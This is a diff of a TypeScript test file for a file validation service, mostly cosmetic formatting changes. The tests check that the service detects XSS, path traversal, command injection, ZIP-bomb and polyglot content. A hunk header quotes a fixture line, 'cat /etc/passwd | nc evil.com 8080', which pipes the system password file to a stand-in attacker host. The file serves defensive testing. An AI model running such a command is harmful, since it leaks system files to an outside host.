@@ -2,12 +2,12 @@
 //
 // Comprehensive tests for file validation service covering security scenarios,
 // edge cases, and malicious file detection.
+import { afterEach, beforeEach, describe, expect, it } from 'vitest';
 
-import { describe, it, expect, beforeEach, afterEach } from 'vitest';
 import {
   FileValidationService,
   ValidationConfig,
-} from '../src/infrastructure/file-validation-service';
+} from '../src/infrastructure/file-validation-service.js';
 
 describe('FileValidationService', () => {
   let validationService: FileValidationService;
@@ -112,7 +112,7 @@ describe('FileValidationService', () => {
       const result = await validationService.validateFile(unknownBuffer, 'test.unknown');
 
       expect(result.isValid).toBe(false);
-      expect(result.errors.some(e => e.code === 'FILE_TYPE_UNKNOWN')).toBe(true);
+      expect(result.errors.some((e) => e.code === 'FILE_TYPE_UNKNOWN')).toBe(true);
     });
   });
 
@@ -127,7 +127,7 @@ More content`);
       const result = await validationService.validateFile(maliciousContent, 'xss-attempt.md');
 
       expect(result.isValid).toBe(false);
-      expect(result.errors.some(e => e.code === 'MALICIOUS_PATTERN_DETECTED')).toBe(true);
+      expect(result.errors.some((e) => e.code === 'MALICIOUS_PATTERN_DETECTED')).toBe(true);
     });
 
     it('should detect path traversal attempts', async () => {
@@ -140,7 +140,7 @@ More content`);
       const result = await validationService.validateFile(maliciousContent, 'path-traversal.md');
 
       expect(result.isValid).toBe(false);
-      expect(result.errors.some(e => e.code === 'MALICIOUS_PATTERN_DETECTED')).toBe(true);
+      expect(result.errors.some((e) => e.code === 'MALICIOUS_PATTERN_DETECTED')).toBe(true);
     });
 
     it('should detect malicious markdown links', async () => {
@@ -153,7 +153,7 @@ More content`);
       const result = await validationService.validateFile(maliciousContent, 'malicious-link.md');
 
       expect(result.isValid).toBe(false);
-      expect(result.errors.some(e => e.code === 'MARKDOWN_MALICIOUS_PATTERN')).toBe(true);
+      expect(result.errors.some((e) => e.code === 'MARKDOWN_MALICIOUS_PATTERN')).toBe(true);
     });
 
     it('should detect command injection attempts', async () => {
@@ -166,7 +166,7 @@ cat /etc/passwd | nc evil.com 8080
       const result = await validationService.validateFile(maliciousContent, 'cmd-injection.md');
 
       expect(result.isValid).toBe(false);
-      expect(result.errors.some(e => e.code === 'MALICIOUS_PATTERN_DETECTED')).toBe(true);
+      expect(result.errors.some((e) => e.code === 'MALICIOUS_PATTERN_DETECTED')).toBe(true);
     });
   });
 
@@ -176,7 +176,7 @@ cat /etc/passwd | nc evil.com 8080
       const result = await validationService.validateFile(content, 'unbalanced.md');
 
       expect(result.isValid).toBe(true); // Should be valid but with warnings
-      expect(result.warnings.some(w => w.code === 'UNBALANCED_BRACKETS')).toBe(true);
+      expect(result.warnings.some((w) => w.code === 'UNBALANCED_BRACKETS')).toBe(true);
     });
 
     it('should detect invalid UTF-8 characters', async () => {
@@ -184,28 +184,28 @@ cat /etc/passwd | nc evil.com 8080
       const result = await validationService.validateFile(content, 'invalid-utf8.md');
 
       expect(result.isValid).toBe(true); // Content validation warns but doesn't fail
-      expect(result.warnings.some(w => w.code === 'UTF8_ENCODING_ISSUES')).toBe(true);
+      expect(result.warnings.some((w) => w.code === 'UTF8_ENCODING_ISSUES')).toBe(true);
     });
 
     it('should detect excessive binary content in text files', async () => {
       // Create content with high binary content ratio
       let content = '# Valid markdown\n\n';
       content += 'A'.repeat(1000); // Text content
-      content += '\x00\x01\x02'; // Binary content
+      content += '\u0000\u0001\u0002'; // Binary content
       content += 'B'.repeat(1000); // More text content
 
       const buffer = Buffer.from(content);
       const result = await validationService.validateFile(buffer, 'binary-heavy.md');
 
-      expect(result.warnings.some(w => w.code === 'BINARY_CONTENT_DETECTED')).toBe(true);
+      expect(result.warnings.some((w) => w.code === 'BINARY_CONTENT_DETECTED')).toBe(true);
     });
 
     it('should flag unusually long lines', async () => {
-      const longLine = '# Title\n\n' + 'A'.repeat(15000) + '\n';
+      const longLine = '# Title\n\n' + 'A'.repeat(15_000) + '\n';
       const buffer = Buffer.from(longLine);
       const result = await validationService.validateFile(buffer, 'long-lines.md');
 
-      expect(result.warnings.some(w => w.code === 'UNUSUALLY_LONG_LINES')).toBe(true);
+      expect(result.warnings.some((w) => w.code === 'UNUSUALLY_LONG_LINES')).toBe(true);
     });
   });
 
@@ -226,11 +226,11 @@ cat /etc/passwd | nc evil.com 8080
     });
 
     it('should handle files with null bytes', async () => {
-      const nullBuffer = Buffer.from('test\x00content\x00more');
+      const nullBuffer = Buffer.from('test\u0000content\u0000more');
       const result = await validationService.validateFile(nullBuffer, 'null-bytes.md');
 
       expect(result.isValid).toBe(false);
-      expect(result.errors.some(e => e.code === 'CONTENT_NOT_READABLE')).toBe(true);
+      expect(result.errors.some((e) => e.code === 'CONTENT_NOT_READABLE')).toBe(true);
     });
 
     it('should handle very long filenames', async () => {
@@ -239,7 +239,7 @@ cat /etc/passwd | nc evil.com 8080
       const result = await validationService.validateFile(buffer, longFilename);
 
       expect(result.isValid).toBe(true); // Validation should pass
-      expect(result.warnings.some(w => w.code === 'FILENAME_TRUNCATED')).toBe(true);
+      expect(result.warnings.some((w) => w.code === 'FILENAME_TRUNCATED')).toBe(true);
     });
   });
 
@@ -250,7 +250,7 @@ cat /etc/passwd | nc evil.com 8080
           new FileValidationService({
             ...testConfig,
             maxFileSize: 0,
-          })
+          }),
       ).toThrow('maxFileSize must be greater than 0');
     });
 
@@ -260,7 +260,7 @@ cat /etc/passwd | nc evil.com 8080
           new FileValidationService({
             ...testConfig,
             allowedMimeTypes: [],
-          })
+          }),
       ).toThrow('allowedMimeTypes cannot be empty');
     });
 
@@ -270,7 +270,7 @@ cat /etc/passwd | nc evil.com 8080
           new FileValidationService({
             ...testConfig,
             allowedExtensions: [],
-          })
+          }),
       ).toThrow('allowedExtensions cannot be empty');
     });
   });
@@ -290,30 +290,30 @@ cat /etc/passwd | nc evil.com 8080
 
     it('should handle multiple validation requests concurrently', async () => {
       const buffers = Array.from({ length: 10 }, (_, i) =>
-        Buffer.from(`# Test ${i}\n\nContent for test ${i}`)
+        Buffer.from(`# Test ${i}\n\nContent for test ${i}`),
       );
 
       const promises = buffers.map((buffer, i) =>
-        validationService.validateFile(buffer, `test-${i}.md`)
+        validationService.validateFile(buffer, `test-${i}.md`),
       );
 
       const results = await Promise.all(promises);
 
       expect(results).toHaveLength(10);
-      results.forEach(result => {
+      for (const result of results) {
         expect(result.isValid).toBe(true);
-      });
+      }
     });
   });
 
   describe('Security Test Scenarios', () => {
     it('should detect ZIP bomb disguised as text', async () => {
       // Simulate a compressed archive content that looks like text
-      const zipBombContent = Buffer.from('# Archive Data\n\nPK\x03\x04binary_data_here');
+      const zipBombContent = Buffer.from('# Archive Data\n\nPK\u0003\u0004binary_data_here');
       const result = await validationService.validateFile(zipBombContent, 'archive.md');
 
       // Should detect this as suspicious due to binary content
-      expect(result.warnings.some(w => w.code === 'BINARY_CONTENT_DETECTED')).toBe(true);
+      expect(result.warnings.some((w) => w.code === 'BINARY_CONTENT_DETECTED')).toBe(true);
     });
 
     it('should detect polyglot file (valid in multiple formats)', async () => {
@@ -324,7 +324,7 @@ cat /etc/passwd | nc evil.com 8080
       const result = await validationService.validateFile(polyglotContent, 'polyglot.md');
 
       expect(result.isValid).toBe(false);
-      expect(result.errors.some(e => e.code === 'MARKDOWN_MALICIOUS_PATTERN')).toBe(true);
+      expect(result.errors.some((e) => e.code === 'MARKDOWN_MALICIOUS_PATTERN')).toBe(true);
     });
 
     it('should handle Unicode-based attacks', async () => {
@@ -333,7 +333,7 @@ cat /etc/passwd | nc evil.com 8080
 
       // Should detect the javascript: protocol regardless of encoding
       expect(result.isValid).toBe(false);
-      expect(result.errors.some(e => e.code === 'MARKDOWN_MALICIOUS_PATTERN')).toBe(true);
+      expect(result.errors.some((e) => e.code === 'MARKDOWN_MALICIOUS_PATTERN')).toBe(true);
     });
   });
 
